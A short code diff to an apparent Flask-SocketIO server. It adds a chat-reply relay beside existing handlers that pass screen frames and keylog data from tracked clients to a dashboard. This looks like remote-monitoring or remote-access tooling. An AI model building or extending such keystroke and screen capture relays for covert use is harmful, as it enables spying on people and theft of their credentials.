@@ -132,6 +132,10 @@ def handle_screen_frame(data):
         clients[cid]['last_seen'] = datetime.now().isoformat()
     socketio.emit('screen_frame', data, to='dashboards')
 
+@socketio.on('chat_reply')
+def handle_chat_reply(data):
+    socketio.emit('chat_reply', data, to='dashboards')
+
 @socketio.on('keylog_data')
 def handle_keylog_data(data):
     socketio.emit('keylog_data', data, to='dashboards')
